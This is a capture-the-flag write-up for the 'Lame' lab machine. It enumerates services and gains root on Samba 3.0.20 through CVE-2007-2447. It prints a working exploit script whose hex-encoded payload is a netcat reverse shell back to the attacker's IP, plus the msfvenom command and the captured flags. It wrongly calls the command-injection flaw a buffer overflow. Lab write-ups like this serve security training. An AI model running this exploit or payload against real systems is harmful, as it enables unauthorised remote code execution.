# Lame
>Author : Xyan1d3
>Date : 22nd June 2021
>IP : 10.10.10.3
>OS : Linux
>Difficulty : Easy

# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Tue Jun 22 10:23:17 2021 as: nmap -sC -sV -oN nmap/lame -v 10.10.10.3
Nmap scan report for lame.htb (10.10.10.3)
Host is up (0.088s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m39s, deviation: 2h49m45s, median: 37s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-06-22T00:54:18-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

We may user the OpenSSH fingerprint to identify the OS running.
![[Pasted image 20210622102743.png]]

From, Here we find out that we have Ubuntu 8.04 Hardy Use's it on default.

## FTP Enumeration
FTP has anonymous login enabled but, has no files inside.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.3]─[~/htb/lame]
└──╼ # ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
```

## SMB Enumeration
We have a SMB Version `Samba 3.0.20-Debian` fingerprint due to a script scan running on SMB.

It has a Buffer Overflow which allows an attacker to get a reverse shell on the box.
Exploit Link : https://github.com/macha97/exploit-smb-3.0.20/blob/master/exploit-smb-3.0.20.py
It is vulnerable to `CVE-2007-2447`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.3]─[~/htb/lame]
└──╼ # cat smb_exploit.py 
#!/usr/bin/python3
#exploit Samba smbd 3.0.20-Debian

from smb import *
from smb.SMBConnection import *

#msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.3 LPORT=8888 -f python
buf =  b""
buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6b"
buf += b"\x62\x61\x65\x61\x62\x3b\x20\x6e\x63\x20\x31\x30\x2e"
buf += b"\x31\x30\x2e\x31\x34\x2e\x33\x20\x38\x38\x38\x38\x20"
buf += b"\x30\x3c\x2f\x74\x6d\x70\x2f\x6b\x62\x61\x65\x61\x62"
buf += b"\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f"
buf += b"\x74\x6d\x70\x2f\x6b\x62\x61\x65\x61\x62\x20\x32\x3e"
buf += b"\x26\x31\x3b\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x6b"
buf += b"\x62\x61\x65\x61\x62"

userID = "/=` nohup " + buf + "`"
password = 'password'
victim_ip = '10.10.10.3'

conn = SMBConnection(userID, password, "HELLO", "TEST", use_ntlm_v2=False)
conn.connect(victim_ip, 445)
```

We have to change the shellcode of the payload and point it onto our attacker machine.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.3]─[~/htb/lame]
└──╼ # msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.3 LPORT=8888 -f python
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 96 bytes
Final size of python file: 483 bytes
buf =  b""
buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6b"
buf += b"\x62\x61\x65\x61\x62\x3b\x20\x6e\x63\x20\x31\x30\x2e"
buf += b"\x31\x30\x2e\x31\x34\x2e\x33\x20\x38\x38\x38\x38\x20"
buf += b"\x30\x3c\x2f\x74\x6d\x70\x2f\x6b\x62\x61\x65\x61\x62"
buf += b"\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f"
buf += b"\x74\x6d\x70\x2f\x6b\x62\x61\x65\x61\x62\x20\x32\x3e"
buf += b"\x26\x31\x3b\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x6b"
buf += b"\x62\x61\x65\x61\x62"
```

### Error fixing on the SMB exploit.
Running this exploit.py with python2 we recieve an error.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.3]─[~/htb/lame]
└──╼ # python2 smb_exploit.py
Traceback (most recent call last):        
  File "smb_exploit.py", line 4, in <module>
    from smb import *                     
ImportError: No module named smb
```

It can be easily be solved by installing the `pysmb` module on python2 with pip.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.3]─[~/htb/lame]
└──╼ # python2 -m pip install pysmb 
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support fo
r Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 
21.0 will remove support for this functionality.
Collecting pysmb
  Downloading pysmb-1.2.7.zip (1.3 MB)    
     |████████████████████████████████| 1.3 MB 189 kB/s                             
Requirement already satisfied: pyasn1 in /usr/local/lib/python2.7/dist-packages (from pysmb) (0.4.8)
Building wheels for collected packages: pysmb
  Building wheel for pysmb (setup.py) ... done
  Created wheel for pysmb: filename=pysmb-1.2.7-py2-none-any.whl size=83815 sha256=8a920c3af16b3159f53249df0352557ddfcb5bab7478df6a1fffd50f5144f28a
  Stored in directory: /root/.cache/pip/wheels/00/9f/0c/7bc6eb00f92216dce583cae3cb71a553c3bce2a86225543825                                                               
Successfully built pysmb
Installing collected packages: pysmb      
Successfully installed pysmb-1.2.7
WARNING: You are using pip version 20.3.3; however, version 20.3.4 is available.
You should consider upgrading via the '/usr/bin/python2 -m pip install --upgrade pip' command.
```

# Initial FootHold (root)
After we have changed the exploit shellcode with `msfvenom` and have fixed the module issues with pip we could now run the exploit while listening the the port.

We on running the exploit we recieve a shell in the box as `root`.

![[Pasted image 20210622105932.png]]

Here, We can stabilize the shell with python pty magic and get our `user.txt` and `root.txt`.

```python
root@lame:/root# ls
Desktop  reset_logs.sh  root.txt  vnc.log
root@lame:/root# cat root.txt 
7cf6bf93dd85493bcc6e0390c5083972
root@lame:/root# cd /home/makis/
root@lame:/home/makis# ls
user.txt
root@lame:/home/makis# cat user.txt 
aaaa5ce9629607b0fd80e4ecacee5df5
```

The OS is also infact `Ubuntu 8.04` hardy.
```python
root@lame:/home/makis# cat /etc/*release*
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04"
```